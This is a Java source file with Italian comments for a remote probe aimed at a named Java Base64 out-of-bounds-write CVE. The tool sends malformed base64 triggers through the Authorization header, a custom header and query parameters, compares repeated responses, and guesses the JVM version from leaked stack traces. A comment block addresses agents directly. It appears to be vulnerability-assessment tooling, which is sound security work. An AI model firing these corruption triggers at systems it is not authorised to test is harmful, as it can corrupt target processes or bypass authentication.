import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;
import java.net.URI;
import java.nio.charset.StandardCharsets;
import java.security.MessageDigest;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.LinkedHashSet;
import java.util.List;
import java.util.Map;
import java.util.Set;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * RemoteProbe - CVE-2026-114938 (Java4Shell) remote applicability probe, NO dependencies.
 *
 * Uso:  java RemoteProbe <url> [loops] [--raw-out file]
 *
 * Cose che fa (solo richieste HTTP GET non distruttive):
 *  1. baseline del page target (status/size/sha256)
 *  2. trigger canonico "A*64 + '='" iniettato in 3 modi:
 *     - Authorization: Basic <trigger>          (pattern auth Basic - il piu' comune)
 *     - header X-Base64-Data: <trigger>         (parametri header custom b64)
 *     - query param ?b64=<trigger>&d=<trigger>  (parametri GET b64)
 *  3. controllo valido per Basic: base64("probe:probe") per distinguere i percorsi di errore
 *  4. analisi divergenza su `loops` ripetizioni (default 50): qualsiasi variazione
 *     status/size/sha256 => anomalia (candidato segnale di corruzione)
 *  5. fingerprint JVM da eventuale stacktrace divulgato (regex line-number noti)
 *  6. output JSONL (una riga per test + summary) e exit code:
 *     0 = ANOMALIA osservata (possibile corruzione/decode raggiunto + side effect)
 *     1 = nessuna anomalia (probabilmente non vulnerabile / corruzione silenziosa)
 *     2 = target irraggiungibile
 *
 * Nota per gli agenti (semantica reale del CVE on-target):
 *  - La OOB write e' ONE-SHOT per call-site/JVM (il primo decode malformato dopo il
 *    training dell'intrinsic C2); dopo, il path deottimizzato e' pulito. L'assenza di
 *    anomalie NON prova l'assenza della vulnerabilita' su call-site gia' "consumati":
 *    prova pero' che non ci sono effetti osservabili (crash/bypass/500) da questo
 *    esterno. Per certezza serve accesso locale (Base64Trigger) o restart del target.
 *  - Se lo stacktrace rivela JDK < 15: la vulnerabilita' NON E' APPLICABILE (l'intrinsic
 *    base64 AVX-512 VBMI esiste solo da JDK 15+). Fidati del campo jvmGuess.
 */
public final class RemoteProbe {

    static final String[] TRIGGERS = {repeat('A', 64) + "=", repeat('A', 128) + "="};
    static final String BASIC_VALID; // base64("probe:probe")
    static {
        StringBuilder sb = new StringBuilder();
        String s = "probe:probe";
        final String T = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
        for (int i = 0; i < s.length(); i += 3) {
            int b0 = s.charAt(i), b1 = i + 1 < s.length() ? s.charAt(i + 1) : 0, b2 = i + 2 < s.length() ? s.charAt(i + 2) : 0;
            sb.append(T.charAt(b0 >> 2)).append(T.charAt(((b0 & 3) << 4) | (b1 >> 4)));
            sb.append(i + 1 < s.length() ? T.charAt(((b1 & 0xF) << 2) | (b2 >> 6)) : '=');
            sb.append(i + 2 < s.length() ? T.charAt(b2 & 0x3F) : '=');
        }
        BASIC_VALID = sb.toString();
    }

    static String repeat(char c, int n) { char[] a = new char[n]; java.util.Arrays.fill(a, c); return new String(a); }

    public static void main(String[] a) throws Exception {
        if (a.length < 1) { System.err.println("uso: java RemoteProbe <url> [loops]"); System.exit(2); }
        URI uri = URI.create(a[0]);
        int loops = a.length > 1 ? Integer.parseInt(a[1]) : 50;
        String host = uri.getHost();
        int port = uri.getPort() > 0 ? uri.getPort() : 80;
        String path = (uri.getRawPath() == null || uri.getRawPath().isEmpty() ? "/" : uri.getRawPath())
                + (uri.getRawQuery() == null ? "" : "?" + uri.getRawQuery());

        R base = get(host, port, path, null, null);
        log("baseline", uri.toString(), base, null);
        if (base.status < 0) { System.out.println("{\"summary\":\"unreachable\"}"); System.exit(2); }

        String jvmGuess = "unknown";
        boolean anomaly = false, decodeReached = false;
        List<String> variants = new ArrayList<>();
        variants.add("baseline");
        variants.add("basic-valid:" + BASIC_VALID);
        variants.add("basic-trig64:" + TRIGGERS[0]);
        variants.add("basic-trig128:" + TRIGGERS[1]);
        variants.add("hdr-xb64:" + TRIGGERS[0]);
        variants.add("param-b64:" + TRIGGERS[0]);

        for (String v : variants) {
            String hdrExtra = null, pathV = path;
            if (v.startsWith("basic-")) hdrExtra = "Authorization: Basic " + v.substring(v.indexOf(':') + 1);
            else if (v.startsWith("hdr-")) hdrExtra = "X-Base64-Data: " + TRIGGERS[0];
            else if (v.startsWith("param-")) {
                String glue = path.contains("?") ? "&" : "?";
                pathV = path + glue + "b64=" + TRIGGERS[0].replace("+", "%2B").replace("=", "%3D");
            }
            Set<String> distinct = new LinkedHashSet<>();
            R first = null;
            String pathUsed = pathV;
            if (v.equals("baseline")) {          // riusa il GET gia' fatto dal main (1 sample)
                first = base; distinct.add(base.status + ":" + base.body.length + ":" + sha256(normalize(base.body)));
                pathUsed = uri.toString();
            } else {
                for (int i = 0; i < loops; i++) {
                    R r = get(host, port, pathV, hdrExtra, null);
                    if (r.status < 0) continue; // reset/timeout di trasporto: NON e' segnale (rumore comune del server)
                    if (first == null) first = r;
                    distinct.add(r.status + ":" + r.body.length + ":" + sha256(normalize(r.body)));
                    String g = guessJvm(r.bodyText());
                    if (!g.equals("unknown")) jvmGuess = g;
                    if (r.bodyText().contains(" at java.") || r.bodyText().contains("Exception")) decodeReached = true;
                }
            }
            log(v, pathUsed, first, distinct);
            if (distinct != null && distinct.size() > 1) anomaly = true;
        }

        boolean applicable = jvmGuess.equals("unknown") || jvmGuess.startsWith("17") || jvmGuess.startsWith("21") || jvmGuess.startsWith("25");
        System.out.println("{\"summary\":\"" + (anomaly ? "ANOMALY" : "stable") + "\""
                + ",\"jvmGuess\":\"" + jvmGuess + "\""
                + ",\"javaVersionApplicable\":" + applicable
                + ",\"stackOrErrorDisclosed\":" + decodeReached
                + ",\"recommendation\":\"" + recommendation(anomaly, jvmGuess, applicable, decodeReached) + "\"}");
        if (jvmGuess.startsWith("8") || jvmGuess.startsWith("11")) System.exit(1);
        System.exit(anomaly ? 0 : 1);
    }

    static String recommendation(boolean anomaly, String jvm, boolean applicable, boolean disclosed) {
        if (jvm.startsWith("8") || jvm.startsWith("11")) return "CVE-2026-114938 NOT applicable (no Base64 intrinsic prima di JDK15); nessuna azione";
        if (anomaly) return "ANOMALIA osservata: possibile corruzione - investigare (diff risposte, restart-watch, auth bypass)";
        if (!disclosed) return "Nessun segnale: decoder Java probabilmente non raggiunto dal trigger; verificare con accesso locale (Base64Trigger)";
        return "Decoder/error path raggiunto ma nessuna divergenza su " + "N ripetizioni: coerente con one-shot gia' consumato o corruzione silenziosa; per certezza serve riavvio/accesso locale";
    }

    static String guessJvm(String body) {
        Matcher m = Pattern.compile("java\\.lang\\.Thread\\.run\\(Thread\\.java:(\\d+)\\)").matcher(body);
        if (m.find()) {
            int ln = Integer.parseInt(m.group(1));
            if (ln >= 740 && ln <= 760) return "8 (Thread.java:" + ln + " - no intrinsic, NON vulnerabile)";
            if (ln >= 820 && ln <= 840) return "11 (Thread.java:" + ln + " - no intrinsic, NON vulnerabile)";
            if (ln >= 1500) return "17/21+ (Thread.java:" + ln + " - intrinsic possibile, VULNERABILE se <=21.0.12/17.0.20 e CPU avx512vbmi)";
            return "java" + ln;
        }
        if (body.contains("Winstone") || body.contains("winstone")) return "unknown";
        return "unknown";
    }

    static void log(String variant, String path, R r, Set<String> distinct) {
        System.out.println("{\"variant\":\"" + variant.replace("\"", "'") + "\",\"path\":\"" + path
                + "\",\"status\":" + r.status + ",\"bytes\":" + r.body.length
                + (distinct == null ? "" : ",\"distinctResponses\":" + distinct.size()) + "}");
    }

    static byte[] normalize(byte[] b) { // struttura semantica: toglie tag, cifre (timestamp/token) e spazi
        String s = new String(b, java.nio.charset.StandardCharsets.UTF_8).replaceAll("<[^>]*>", " ");
        StringBuilder out = new StringBuilder();
        for (String w : s.split("\\s+")) {
            StringBuilder word = new StringBuilder();
            for (char ch : w.toCharArray()) if (!((ch >= '0' && ch <= '9') )) word.append(ch);
            String w2 = word.toString();
            if (w2.matches("[0-9a-fA-F]{8,}")) continue; // token esadecimali random (sessione)
            if (w2.length() > 0) out.append(w2).append(' ');
        }
        return out.toString().getBytes(java.nio.charset.StandardCharsets.UTF_8);
    }

    static String sha256(byte[] b) {
        try {
            MessageDigest md = MessageDigest.getInstance("SHA-256");
            byte[] h = md.digest(b);
            StringBuilder sb = new StringBuilder();
            for (int i = 0; i < 8; i++) sb.append(String.format("%02x", h[i]));
            return sb.toString();
        } catch (Exception e) { return "?"; }
    }

    // ---------- http minimale (GET, Connection: close) ----------
    static final class R {
        final int status; final Map<String, String> headers; final byte[] body;
        R(int s, Map<String, String> h, byte[] b) { status = s; headers = h; body = b; }
        String bodyText() { return new String(body, StandardCharsets.UTF_8); }
    }

    static R get(String host, int port, String path, String hdrExtra, byte[] body) {
        try (Socket s = new Socket(host, port)) {
            s.setSoTimeout(15000);
            OutputStream os = s.getOutputStream();
            StringBuilder sb = new StringBuilder();
            sb.append(body == null ? "GET" : "POST").append(" ").append(path).append(" HTTP/1.1\r\nHost: ").append(host)
                    .append("\r\nConnection: close\r\n");
            if (hdrExtra != null) sb.append(hdrExtra).append("\r\n");
            if (body != null) sb.append("Content-Length: ").append(body.length).append("\r\n");
            sb.append("\r\n");
            os.write(sb.toString().getBytes(StandardCharsets.US_ASCII));
            if (body != null) os.write(body);
            os.flush();
            InputStream is = s.getInputStream();
            Map<String, String> headers = new HashMap<>();
            int status = -1; String line;
            while ((line = readLine(is)) != null && !line.isEmpty()) {
                if (status < 0) { String[] p = line.split(" "); if (p.length >= 2) status = Integer.parseInt(p[1]); }
                else { int c = line.indexOf(':'); if (c > 0) headers.put(line.substring(0, c).trim().toLowerCase(), line.substring(c + 1).trim()); }
            }
            java.io.ByteArrayOutputStream bo = new java.io.ByteArrayOutputStream();
            byte[] buf = new byte[8192]; int r;
            while ((r = is.read(buf)) > 0) bo.write(buf, 0, r);
            return new R(status, headers, bo.toByteArray());
        } catch (IOException e) {
            return new R(-1, new HashMap<>(), new byte[0]);
        }
    }

    static String readLine(InputStream is) throws IOException {
        StringBuilder sb = new StringBuilder(); int b;
        while ((b = is.read()) != -1) { if (b == '\n') break; if (b != '\r') sb.append((char) b); }
        return b == -1 && sb.isEmpty() ? null : sb.toString();
    }
}
